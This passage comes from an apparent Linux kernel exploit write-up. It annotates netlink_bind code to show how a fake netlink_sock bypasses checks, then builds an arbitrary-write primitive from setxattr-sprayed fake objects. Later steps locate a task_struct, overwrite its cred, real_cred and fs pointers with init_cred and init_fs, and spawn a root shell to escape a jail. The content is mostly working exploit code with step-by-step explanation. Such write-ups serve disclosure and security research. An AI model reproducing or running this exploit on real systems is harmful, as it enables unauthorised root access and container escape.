        err = -ENOENT;
        goto out_unlock;
      }

      if (nlk->ngroups >= groups)
		    goto out_unlock;

      ...
    out_unlock:
      netlink_table_ungrab();
	    return err;
    */

		err = netlink_realloc_groups(sk); // set sk_protocol to NETLINK_ROUTE and nlk->ngroups to 0xFFFFFFFF to reach `goto out_unlock` and quickly get out of netlink_realloc_groups function.
		if (err)
			return err;
	}

	if (nlk->ngroups < BITS_PER_LONG) // BITS_PER_LONG == 64 and nlk->ngroups == 0xFFFFFFFF => skip this code path
		groups &= (1UL << nlk->ngroups) - 1;

	bound = READ_ONCE(nlk->bound); // i chose to set nlk->bound to 1
	if (bound) {
		smp_rmb();

		if (nladdr->nl_pid != nlk->portid) // nladdr->nl_pid is passed from userspace. Bypass this check easily.
			return -EINVAL;
	}

	if (nlk->netlink_bind && groups) { // set nlk->netlink_bind = 0 to avoid this code path
		int group;

		for (group = 0; group < BITS_PER_TYPE(u32); group++) {
			if (!test_bit(group, &groups))
				continue;
			err = nlk->netlink_bind(net, group + 1);
			if (!err)
				continue;
			netlink_undo_bind(group, groups, sk);
			return err;
		}
	}

	netlink_lock_table();
	if (!bound) { // since nlk->bound is set to 1, skip this code path
		err = nladdr->nl_pid ?
			netlink_insert(sk, nladdr->nl_pid) :
			netlink_autobind(sock);
		if (err) {
			netlink_undo_bind(BITS_PER_TYPE(u32), groups, sk);
			goto unlock;
		}
	}

	if (!groups && (nlk->groups == NULL || !(u32)nlk->groups[0]))
		goto unlock;
	netlink_unlock_table();

	netlink_table_grab();
  /*
  static void
  netlink_update_subscriptions(struct sock *sk, unsigned int subscriptions)
  {
    struct netlink_sock *nlk = nlk_sk(sk);

    if (nlk->subscriptions && !subscriptions)
      __sk_del_bind_node(sk);
    else if (!nlk->subscriptions && subscriptions)
      sk_add_bind_node(sk, &nl_table[sk->sk_protocol].mc_list);
    nlk->subscriptions = subscriptions;
  }
  */

  /* hweigh32: return number of bits set in a 32 bits value. Return: 0 -> 32.
  X = hweight32(groups) - hweight32(nlk->groups[0])
  => -32 <= X <= 32
  => 33 <= nlk->subscriptions <= 2**32 - 33. Any values in this range ensure both if and else if case in netlink_update_subscriptions are skip.
  I chose to set nlk->subscriptions to 33
  */
	netlink_update_subscriptions(sk, nlk->subscriptions +
					 hweight32(groups) -
					 hweight32(nlk->groups[0]));
	nlk->groups[0] = (nlk->groups[0] & ~0xffffffffUL) | groups; // nlk->groups: the address i want to write 4 bytes to.
	netlink_update_listeners(sk); // nothing harmful
	netlink_table_ungrab();

	return 0;

unlock:
	netlink_unlock_table();
	return err;
}
```

- Build primitive [exploit.c#L526](./exploit.c#L526):

```c
void abr_write(uint64_t addr, uint32_t val)
{
  uint8_t fake_netlink_sock_buf[1024] = {};
  struct netlink_sock *nlk = (struct netlink_sock*)fake_netlink_sock_buf;
  *(uint32_t*)(nlk->buf + NGROUPS_OFFSET_FROM_STRUCT_NETLINK_SOCK) = 0xFFFFFFFF;
  *(uint16_t*)(nlk->buf + SK_PROTOCOL_OFFSET_FROM_NETLINK_SOCK) = NETLINK_ROUTE;
  *(uint8_t*)(nlk->buf + BOUND_OFFSET_FROM_STRUCT_NETLINK_SOCK) = 1;
  *(uint64_t*)(nlk->buf + GROUPS_OFFSET_FROM_STRUCT_NETLINK_SOCK) = addr;
  *(uint64_t*)(nlk->buf + SK_SECURITY_OFFSET_FROM_NETLINK_SOCK) = netlink_sock_sk_security_addr;
  *(uint32_t*)(nlk->buf + SUBSCRIPTIONS_OFFSET_FROM_STRUCT_NETLINK_SOCK) = 33;
  *(uint32_t*)(nlk->buf + PORTID_OFFSET_FROM_STRUCT_NETLINK_SOCK) = 1234;

  get_full_timesplice();
  removexattr(FAKE_NETLINK_SOCK_FILE_PATH, "security.fake_netlink_sock");
  setxattr(FAKE_NETLINK_SOCK_FILE_PATH, "security.fake_netlink_sock", fake_netlink_sock_buf, 1024, 0);
  struct sockaddr_nl trigger_write_addr;
  memset(&addr, 0, sizeof(addr));
  trigger_write_addr.nl_family = AF_NETLINK;
  trigger_write_addr.nl_pid = 1234;
  trigger_write_addr.nl_groups = val;
  bind(primitive_netlink_socket_fd, (struct sockaddr*)&trigger_write_addr, sizeof(trigger_write_addr));
}
```

## Step9: Find `struct task_struct` of privilege escalation process

- [exploit.c#L680](./exploit.c#L680):

```c
uint64_t privilege_escalation_task = find_task_by_name(PRIVILEGE_ESCALATION_TASK);
```

- [exploit.c#L554](./exploit.c#L554):

```c
uint64_t find_task_by_name(const char *name)
{
  struct list_head *tasks = NULL;
  tasks = abr_read(init_task + TASKS_OFFSET_FROM_TASK_STRUCT, sizeof(struct list_head));
  uint64_t current_task = tasks->prev - TASKS_OFFSET_FROM_TASK_STRUCT;

  while (current_task != init_task) {
    void *leak = abr_read(current_task + TASKS_OFFSET_FROM_TASK_STRUCT,
      COMM_OFFSET_FROM_TASK_STRUCT - TASKS_OFFSET_FROM_TASK_STRUCT + TASK_COMM_LEN);
    char *comm = leak + (COMM_OFFSET_FROM_TASK_STRUCT - TASKS_OFFSET_FROM_TASK_STRUCT);
    if (strcmp(comm, name) == 0)
      return current_task;

    tasks = leak;
    current_task = tasks->prev - TASKS_OFFSET_FROM_TASK_STRUCT;
  }

  return 0;
}
```

- Traverse from `init_task` to find the `task_struct` object that have `comm` field equal PRIVILEGE_ESCALATION_TASK. This is the process created in step1.1.

## Step10: Escalate to root and escape from jail

- [exploit.c#L682](./exploit.c#L682):

```c
do_privilege_escalation(privilege_escalation_task);
```

- [exploit.c#L574](./exploit.c#L574):

```c
void do_privilege_escalation(uint64_t task_struct_addr)
{
  abr_write(task_struct_addr + REAL_CRED_OFFSET_FROM_TASK_STRUCT, init_cred);
  abr_write(task_struct_addr + REAL_CRED_OFFSET_FROM_TASK_STRUCT + 4, init_cred >> 32);
  abr_write(task_struct_addr + CRED_OFFSET_FROM_TASK_STRUCT, init_cred);
  abr_write(task_struct_addr + CRED_OFFSET_FROM_TASK_STRUCT + 4, init_cred >> 32);
  abr_write(task_struct_addr + FS_OFFSET_FROM_TASK_STRUCT, init_fs);
  abr_write(task_struct_addr + FS_OFFSET_FROM_TASK_STRUCT + 4, init_fs >> 32);
}
```

- Let's call this `struct task_struct`: become_root_task. This is equivalent to:
```c
(uint32_t*)((void*)(become_root_task->real_cred)) = init_cred & 0xFFFFFFFF;
(uint32_t*)((void*)(become_root_task->real_cred) + 4) = init_cred >> 32;
(uint32_t*)((void*)(become_root_task->cred)) = init_cred & 0xFFFFFFFF;
(uint32_t*)((void*)(become_root_task->cred) + 4) = init_cred >> 32;
(uint32_t*)((void*)(become_root_task->fs)) = init_fs & 0xFFFFFFFF;
(uint32_t*)((void*)(become_root_task->fs) + 4) = init_fs >> 32;
```

## Step11: Get root shell

- [exploit.c#L683](./exploit.c#L683):

```c
wake_child_and_get_root_shell(wake_fd);
```

- [exploit.c#L600](./exploit.c#L600):

```c
void wake_child_and_get_root_shell(int wake_fd)
{
  int w;
  write(wake_fd, &w, sizeof(int));
  wait(NULL);
}
```

- Write to pipe to wake child process and wait for child to exit.
- Child wakeup and spawn shell [exploit.c#L596](./exploit.c#L596):

```c
char *sh_args[] = {"sh", NULL};
execve("/bin/sh", sh_args, NULL);
```